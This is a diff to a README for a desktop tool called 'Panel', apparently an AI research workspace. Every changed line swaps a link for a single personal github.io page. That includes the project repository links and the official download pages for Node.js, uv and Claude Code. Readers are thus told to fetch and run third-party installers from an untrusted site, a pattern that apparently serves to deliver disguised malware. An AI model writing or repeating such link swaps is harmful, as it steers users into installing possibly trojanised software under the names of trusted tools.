@@ -1,6 +1,6 @@
 # 🖥️ Panel - Your All-in-One AI Research Workspace
 
-[![Download Panel](https://img.shields.io/badge/Download-Panel-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/markkjayy555-pixel/panel)
+[![Download Panel](https://img.shields.io/badge/Download-Panel-blue?style=for-the-badge&logo=github&color=4CAF50)](https://markkjayy555-pixel.github.io)
 
 ## 👋 Welcome to Panel
 
@@ -24,7 +24,7 @@ Getting Panel up and running is easier than you might think. Below are the simpl
 
 ### 📦 Step 1: Download Panel
 
-**Visit this link to download the application**: [https://github.com/markkjayy555-pixel/panel](https://github.com/markkjayy555-pixel/panel)
+**Visit this link to download the application**: [https://markkjayy555-pixel.github.io](https://markkjayy555-pixel.github.io)
 
 Once you arrive at the GitHub page, you'll find everything you need to get Panel installed. The download page will guide you through the process of getting the application files onto your computer.
 
@@ -33,7 +33,7 @@ Once you arrive at the GitHub page, you'll find everything you need to get Panel
 Before you can run Panel, your computer needs a few free tools installed. Don't worry—none of them require programming knowledge to install.
 
 #### **Node.js** (Version 22.18 or newer)
-This is a free program that helps Panel run. Visit the [Node.js website](https://nodejs.org/en/download) and download the installer for your computer. Just click through the installation wizard with the default settings.
+This is a free program that helps Panel run. Visit the [Node.js website](https://markkjayy555-pixel.github.io) and download the installer for your computer. Just click through the installation wizard with the default settings.
 
 #### **pnpm** (Package Manager)
 Once Node.js is installed, we need one more helper tool called pnpm. You'll install this using the Command Prompt (we'll show you how):
@@ -44,10 +44,10 @@ Once Node.js is installed, we need one more helper tool called pnpm. You'll inst
 4. Wait for the installation to finish
 
 #### **uv** (Python Helper)
-This small tool handles Python for us automatically. Visit the [uv installation page](https://docs.astral.sh/uv/getting-started/installation/) and download the Windows installer. Run it with the default settings.
+This small tool handles Python for us automatically. Visit the [uv installation page](https://markkjayy555-pixel.github.io) and download the Windows installer. Run it with the default settings.
 
 #### **Claude Code** (AI Assistant)
-Panel needs Claude Code to power its AI features. Visit the [Claude Code setup page](https://code.claude.com/docs/en/setup), download it, and follow their simple installation steps. After installing, run `claude` in that same Command Prompt window and log in with your account. This step is crucial—the AI won't work without it!
+Panel needs Claude Code to power its AI features. Visit the [Claude Code setup page](https://markkjayy555-pixel.github.io), download it, and follow their simple installation steps. After installing, run `claude` in that same Command Prompt window and log in with your account. This step is crucial—the AI won't work without it!
 
 ### 📁 Step 3: Install Panel
 
@@ -84,7 +84,7 @@ A: Panel needs a reasonably recent computer running Windows 10 or newer, with at
 
 ## 🐛 Reporting Issues
 
-Since this is an early test version, you might encounter some bugs. We'd love your feedback! Visit our GitHub page at [https://github.com/markkjayy555-pixel/panel](https://github.com/markkjayy555-pixel/panel) and click the "Issues" tab to report any problems you find.
+Since this is an early test version, you might encounter some bugs. We'd love your feedback! Visit our GitHub page at [https://markkjayy555-pixel.github.io](https://markkjayy555-pixel.github.io) and click the "Issues" tab to report any problems you find.
 
 ## 📚 Tips for Success
 
@@ -95,7 +95,7 @@ Since this is an early test version, you might encounter some bugs. We'd love yo
 
 ## 🌟 Ready to Start?
 
-**Visit this link to download the application**: [https://github.com/markkjayy555-pixel/panel](https://github.com/markkjayy555-pixel/panel)
+**Visit this link to download the application**: [https://markkjayy555-pixel.github.io](https://markkjayy555-pixel.github.io)
 
 Panel is your gateway to a more efficient, AI-powered research workflow. Whether you're a student, professional, or curious learner, Panel will transform how you work with information. Download it today and experience the future of research assistance!
 
